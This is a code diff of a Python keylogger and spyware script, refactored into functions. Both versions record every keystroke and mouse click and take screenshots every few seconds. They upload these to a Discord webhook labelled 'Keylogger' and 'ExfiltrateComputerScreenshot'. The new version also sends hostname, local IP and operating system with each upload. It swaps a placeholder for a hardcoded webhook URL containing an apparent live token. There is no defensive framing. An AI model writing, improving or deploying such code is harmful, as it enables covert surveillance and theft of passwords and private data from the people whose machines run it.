@@ -1,134 +1,122 @@
-# Import required libraries
 import pyautogui
 import requests
-from pynput.keyboard import Key, Listener
+import socket
+import platform
+from pynput.keyboard import Key, Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
-import datetime
-import logging
 import time
+import pyperclip
 
-# Keylogger variables
-keys_information = "key_log.txt"
-iterationTimeSeconds = 60
-number_of_iterations_end = 1
-totalExpectedTimeSeconds = iterationTimeSeconds * number_of_iterations_end
-totalExpectedTimeMinutes = totalExpectedTimeSeconds / 60
-currentTime = time.time()
-stoppingTime = time.time() + iterationTimeSeconds
+# Constants
+KEYS_INFORMATION_FILE = "key_log.txt"
+SCREENSHOT_INTERVAL_SECONDS = 5
+RUN_TIME_SECONDS = 60
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1160773937333018666/MqHAfoWi0vIBzTF8Z9_n_nHVcZ8W4I3Jo7SebkczEal7wQc3uCqOdIX-sJYBV9yMA4wJ"
 
-# Mouse click recorder variables
-clicks = []
-
-# Discord webhook URL
-discord_webhook = "YOUR_DISCORD_WEBHOOK_URL"
-
-# Function to record key presses
-def on_press(key):
-    global keys, count, currentTime
-
-    print(key)
-    keys.append(key)
-    count += 1
-    currentTime = time.time()
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-
-# Function to write key presses to a file
-def write_file(keys):
-    with open(keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
-        f.close()
-
-# Function to record mouse clicks
-def on_click(x, y, button, pressed):
-    if pressed:
-        clicks.append((x, y, button, time.time()))
-
-# Start recording mouse clicks and key presses
-print("Recording mouse clicks, keyboard input, and taking screenshots for 1 minute...")
-
+# Global variables
+keys_pressed = []
+mouse_clicks = []
 start_time = time.time()
-runTimeSeconds = 60
-runTimeMinutes = runTimeSeconds / 60
-end_time = start_time + runTimeSeconds
-
 count = 0
-keys = []
 
-with Listener(on_press=on_press, on_release=None) as key_listener, MouseListener(on_click=on_click) as mouse_listener:
+def get_ip_address():
+    """Retrieve the local IP address of the primary network interface."""
     try:
-        while time.time() < end_time:
-            if int(time.time() - start_time) % 5 == 0:
-                # Take a screenshot
-                screenshot = pyautogui.screenshot()
-                screenshot.save(f"screenshot_{int(time.time() - start_time)}.png")
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return '127.0.0.1'
 
-                # Send the screenshot to Discord
-                with open(f"screenshot_{int(time.time() - start_time)}.png", "rb") as f:
-                    photo = f.read()
-                request_data = {
-                    "username": "ExfiltrateComputerScreenshot"
-                }
-                response = requests.post(discord_webhook, data=request_data, files={"screenshot.png": photo})
+def get_system_info():
+    """Gather system information like hostname and operating system."""
+    hostname = socket.gethostname()
+    local_ip = get_ip_address()
+    operating_system = platform.system() + " " + platform.release()
+    return hostname, local_ip, operating_system
 
-                if response.status_code == 200:
-                    print("Screenshot successfully sent to Discord!")
-                else:
-                    print(f"Error while sending screenshot to Discord: {response.status_code}")
+def on_key_press(key):
+    """Callback function to handle key press events."""
+    global keys_pressed
 
-    except KeyboardInterrupt:
-        pass
+    keys_pressed.append((key, time.time()))
+    write_data_to_file()
 
-# Send the key_log.txt to Discord
-with open(keys_information, "rb") as f:
-    keylog = f.read()
-request_data = {
-    "username": "Keylogger",
-    "content": "Key Log",
-}
-response = requests.post(discord_webhook, data=request_data, files={"key_log.txt": keylog})
+def on_mouse_click(x, y, button, pressed):
+    """Callback function to record mouse clicks."""
+    if pressed:
+        mouse_clicks.append((x, y, button, time.time()))
+        write_data_to_file()
 
-if response.status_code == 200:
-    print("Key log successfully sent to Discord!")
-else:
-    print(f"Error while sending key log to Discord: {response.status_code}")
+def write_data_to_file():
+    """Write the captured keys and mouse clicks to a file."""
+    with open(KEYS_INFORMATION_FILE, "a") as file:
+        for item in keys_pressed + mouse_clicks:
+            if isinstance(item, tuple) and len(item) == 4:  # Mouse click data
+                x, y, button, click_time = item
+                file.write(f"Mouse Click: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f}\n")
+            elif isinstance(item, tuple) and len(item) == 2:  # Key press data
+                key, key_time = item
+                key_str = str(key).replace("'", "")
+                if key_str.find("space") > 0:
+                    file.write('\n')
+                elif key_str.find("Key") == -1:
+                    file.write(key_str)
 
-# Display recorded clicks
-print("Recorded clicks:")
-for i, click in enumerate(clicks, 1):
-    x, y, button, click_time = click
-    print(f"Click {i}: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f} seconds")
+        keys_pressed.clear()
+        mouse_clicks.clear()
 
-# Save recorded clicks to a file (optional)
-with open("recorded_clicks.txt", "w") as file:
-    for i, click in enumerate(clicks, 1):
-        x, y, button, click_time = click
-        file.write(f"Click {i}: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f} seconds\n")
+def take_and_send_screenshot():
+    """Take a screenshot and send it to Discord."""
+    screenshot_filename = f"screenshot_{int(time.time() - start_time)}.png"
+    screenshot = pyautogui.screenshot()
+    screenshot.save(screenshot_filename)
 
-# Count the number of words typed
-with open('key_log.txt', 'r') as file:
-    lines = file.readlines()
-wordsInLogFile = len(lines)
+    time.sleep(1)  # Ensure file is saved
 
-print(f"Number of minutes that have passed since the log file started: {totalExpectedTimeMinutes}")
-print(f"Number of words in the log file: {wordsInLogFile}")
-wordsPerMinute = wordsInLogFile
+    try:
+        with open(screenshot_filename, "rb") as f:
+            photo = f.read()
+        hostname, local_ip, operating_system = get_system_info()
+        current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        request_data = {
+            "username": "ExfiltrateComputerScreenshot",
+            "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}"
+        }
+        response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"screenshot.png": photo})
+        if response.status_code != 200:
+            print(f"Error while sending screenshot to Discord: {response.status_code}")
+    except FileNotFoundError:
+        print(f"Failed to open the screenshot file: {screenshot_filename}")
 
-# Measure the amount of mouse clicks
-clicksInLogFile = len(clicks)
-print(f"Number of minutes that have passed since the log file started: {runTimeMinutes}")
-print(f"Number of clicks in the log file: {clicksInLogFile}")
-clicksPerMinute = clicksInLogFile
+def main():
+    """Main function to start keylogger and mouse listener."""
+    print("Recording mouse clicks, keyboard input, and taking screenshots for 1 minute...")
 
-print(f"Number of words per minute: {wordsPerMinute}")
-print(f"Number of clicks per minute: {clicksPerMinute}")
+    with KeyboardListener(on_press=on_key_press) as key_listener, MouseListener(on_click=on_mouse_click) as mouse_listener:
+        try:
+            while time.time() < start_time + RUN_TIME_SECONDS:
+                if int(time.time() - start_time) % SCREENSHOT_INTERVAL_SECONDS == 0:
+                    take_and_send_screenshot()
+        except KeyboardInterrupt:
+            pass
+
+    # Send the key_log.txt to Discord
+    with open(KEYS_INFORMATION_FILE, "rb") as f:
+        keylog = f.read()
+    hostname, local_ip, operating_system = get_system_info()
+    current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    request_data = {
+        "username": "Keylogger",
+        "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}\nKey Log"
+    }
+    response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"key_log.txt": keylog})
+    if response.status_code != 200:
+        print(f"Error while sending key log to Discord: {response.status_code}")
 
 print("Recording completed.")
+   
+
+if __name__ == "__main__":
+    main()
+
